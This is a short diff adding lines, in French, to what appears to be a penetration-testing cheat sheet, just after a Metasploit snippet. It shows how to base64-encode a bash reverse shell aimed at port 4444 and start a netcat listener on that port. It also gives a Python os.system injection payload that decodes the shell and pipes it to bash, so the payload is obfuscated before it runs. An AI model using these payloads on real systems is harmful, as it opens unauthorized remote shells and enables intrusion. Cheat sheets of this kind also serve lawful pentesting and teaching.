@@ -168,3 +168,14 @@ set <RHOST>
 set <PORT>
 run
 ```
+
+Reverse shell encodé en bqse64 :
+```
+echo 'bash -c "bash -i >& /dev/tcp/192.xxx.xx.xx/4444 0>&1"' | base64
+-> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNy4yNTAuMi80NDQ0IDA+JjEiCg==
+```
+puis : nc -lvp 4444
+```
+__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNy4yNTAuMi80NDQ0IDA+JjEiCg== | base64 -d | bash")
+
+```
